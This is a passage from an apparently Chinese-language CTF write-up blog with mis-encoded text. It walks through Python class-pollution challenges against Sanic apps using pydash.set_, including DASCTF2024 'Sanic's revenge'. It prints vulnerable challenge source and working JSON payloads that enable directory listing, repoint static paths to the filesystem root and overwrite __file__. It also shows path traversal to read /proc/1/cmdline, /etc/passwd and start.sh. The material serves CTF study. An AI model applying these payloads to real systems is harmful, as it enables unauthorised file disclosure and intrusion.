class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="comment">#from sanic_session import Session</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"><span class="comment">#Session(app)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment">#async def index(request):</span></span><br><span class="line">    <span class="comment">#return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&quot;/login&quot;)</span></span><br><span class="line"><span class="comment">#async def login(request):</span></span><br><span class="line">    <span class="comment">#user = request.cookies.get(&quot;user&quot;)</span></span><br><span class="line">    <span class="comment">#if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class="line">        <span class="comment">#request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class="line">        <span class="comment">#return text(&quot;login success&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#return text(&quot;login fail&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">print</span>(app.router.name_index)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(app.router.name_index[&#x27;name&#x27;].directory_view)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¾“å‡ºåº”è¯¥æ¥è¿‘è¿™æ ·ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/de66f739b68d4092a1c471efee8f4a6b.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹çœ‹å‡ºæ¥äº†è·¯ç”±æ˜¯  <code>&quot;__mp_main__.static&quot;</code> ï¼Œä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­äº†ï¼ˆå…·ä½“é“¾å­æ€ä¹ˆæ‰¾ï¼Œå‚è€ƒ gxngxngxn å¤§ä½¬çš„æ–‡ç« ï¼‰ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¸Šé¢çš„ payload æ˜¯å¼€å¯ç›®å½•åŠŸèƒ½ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ª payload æ˜¯å°†æŒ‡å®šç›®å½•æ±¡æŸ“ä¸ºæ ¹ç›®å½•ï¼Œä¹‹åè®¿é—® /static/ ç›®å½•ï¼Œå°±èƒ½çœ‹åˆ°æ ¹ç›®å½•ä¸‹å¼€å§‹çš„æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶åäº† /</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flagæ–‡ä»¶åå­—&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ª payload æ˜¯ç”¨æ¥è¯» flag æ–‡ä»¶çš„ï¼Œä¹‹åè®¿é—® src è·¯ç”±å³å¯è·å¾— flagã€‚</p><h2 id="dasctf2024å¤å­£æŒ‘æˆ˜èµ›sanics-revenge"><a class="markdownIt-Anchor" href="#dasctf2024å¤å­£æŒ‘æˆ˜èµ›sanics-revenge">#</a> [DASCTF2024 å¤å­£æŒ‘æˆ˜èµ›] Sanicâ€™s revenge</h2><p>â€‹é¢˜ç›®ç»™äº†ä¸ªé™„ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ç›´æ¥å¼€å§‹å®¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçš„æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸€çœ¼ä¸ä¸çœŸã€‚è¿™ä¸ªæ„Ÿè§‰å’Œä¹‹å‰æ‰“çš„é¢˜éƒ½ä¸ä¸€æ ·ï¼Œå› ä¸ºä¹‹å‰çš„æ€è·¯éƒ½æ˜¯æ±¡æŸ“ <code>__file__</code> å±æ€§ï¼Œä½†æ˜¯è¿™ä¸€æ¬¡ä¼¼ä¹ä¸æ˜¯ï¼Œå¹¶ä¸”ï¼Œpollute è·¯ç”±è¿˜è¿‡æ»¤äº† parts å’Œ proc ä»¥åŠé™åˆ¶ value ä¸èƒ½æ˜¯åˆ—è¡¨ã€‚</p><p>â€‹è¿™ä¸ªé¢˜æˆ‘ä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼Œæ„Ÿè§‰å¾ˆé€†å¤©ï¼Œè€ƒç‚¹ä¸»è¦çš„æ˜¯ sanic æ¡†æ¶çš„æ¼æ´é¢˜ï¼Œå…ˆè´´ä¸€ä¸‹åŸç†å§ï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½ã€‚</p><p>â€‹é¦–å…ˆæ˜¯æ ¹åŸº static å‡½æ•°ï¼Œä¹‹åï¼Œä¹‹åè·Ÿè¿› <code>DirectoryHandler</code>  ç±»ï¼Œæ‰¾åˆ°äº†å¦‚ä¸‹ä¸¤æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">      current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.directory_view:</span><br><span class="line">          <span class="keyword">return</span> self._index(</span><br><span class="line">              self.directory / current, path, request.app.debug</span><br><span class="line">          )</span><br></pre></td></tr></table></figure><p>â€‹å½“å¼€å¯äº†ç›®å½•åŠŸèƒ½åï¼Œå°±ä¼šè¿›å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self._index(</span><br><span class="line">             self.directory / current, path, request.app.debug</span><br><span class="line">         )</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œè·Ÿè¿› <code>_index</code>  çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_index</span>(<span class="params">self, location: Path, path: <span class="built_in">str</span>, debug: <span class="built_in">bool</span></span>):</span><br><span class="line">    <span class="comment"># Remove empty path elements, append slash</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;//&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            <span class="string">&quot;/&quot;</span> + <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;p&#125;</span>/&quot;</span> <span class="keyword">for</span> p <span class="keyword">in</span> path.split(<span class="string">&quot;/&quot;</span>) <span class="keyword">if</span> p])</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Render file browser</span></span><br><span class="line">    page = DirectoryPage(self._iter_files(location), path, debug)</span><br><span class="line">    <span class="keyword">return</span> html(page.render())</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜¾ç„¶ï¼Œ <code>_index</code>  æ˜¯ä¸€ä¸ªæ‹¼æ¥å‡½æ•°ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ‹¼æ¥ç›®å½•çš„ã€‚æ ¹æ®ä¸‹é¢è¿™ä¸€è¡Œï¼Œæˆ‘ä»¬åˆæœ‰äº†å¯ä»¥æ“ä½œçš„ç©ºé—´äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç°äº†å•¥ï¼Ÿè¿™é‡Œ path åœ¨è¢«åˆ†å‰²çš„æ—¶å€™æœ‰ä¸ªæƒ…å†µï¼Œå°±æ˜¯å°†è·¯å¾„ä» base å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æ‰€æœ‰å­—ç¬¦ä¸²å»æ‰å¤´å°¾çš„ <code>'/'</code>  å­—ç¬¦åè¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬æŠŠ base å±æ€§æ±¡æŸ“æˆæŒ‡å®šçš„å­—ç¬¦ä¸²ä¹‹åï¼Œåé¢å¦‚æœå‡ºç°äº†ä¸¤ä¸ªç‚¹ï¼Œä¹Ÿå°±æ˜¯ <code>..</code>  å°±è¯´æ˜äº† current è¿”å›çš„å­—ç¬¦ä¸²å¯èƒ½å­˜åœ¨è·¯å¾„ç©¿è¶Šã€‚</p><p>â€‹å¥½äº†ï¼Œ å†å›æ¥çœ‹çœ‹è¿™ä¸ªé¢˜ï¼Œé¦–å…ˆï¼Œæœ€å¥½åº”è¯¥å…ˆè·å–å®Œæ•´çš„æºä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åƒä¹‹å‰çš„é¢˜ä¸€æ ·æ±¡æŸ“ <code>directory_view</code>  å±æ€§æ‰“å¼€é™æ€æ–‡ä»¶ç›®å½•ã€‚payload å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#è¿™ä¸ªpayloadä¸çŸ¥é“ä¸ºå•¥è®¿é—®staticç›®å½•çš„æ—¶å€™æ„Ÿè§‰æ²¡å•¥å˜åŒ–ï¼Œä½†æ˜¯å¦‚æœåŠ ä¸Šäº†åƒä»€ä¹ˆ/static/etc/passwdä¹‹ç±»çš„æ–‡ä»¶å´èƒ½è®¿é—®åˆ°</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/d67ac7ea195d460b8d80bdeb0f7d00a9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ—¢ç„¶èƒ½æˆï¼Œé‚£æ­£å¸¸è®¿é—® <code>/static/proc/1/cmdline</code> ï¼Œå‘ç°äº†é‡è¦çš„ä¸œè¥¿ï¼Œå°±æ˜¯</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  /start.sh</span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® <code> /static/start.sh</code>  ä¹‹åè·å¾—ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [[ -f /flag.sh ]]; then</span><br><span class="line">source /flag.sh</span><br><span class="line">rm -f /flag.sh</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">python3 /app/2Q17A58T9F65y5i8.py</span><br></pre></td></tr></table></figure><p>â€‹æ‰¾åˆ°äº†æ–‡ä»¶åäº†ï¼Œè¯»å– <code>/static/app/2Q17A58T9F65y5i8.py</code>  çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line">   </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#æ–¹ä¾¿ç®¡ç†å‘˜æŸ¥çœ‹éæ³•æ—¥å¿—</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir 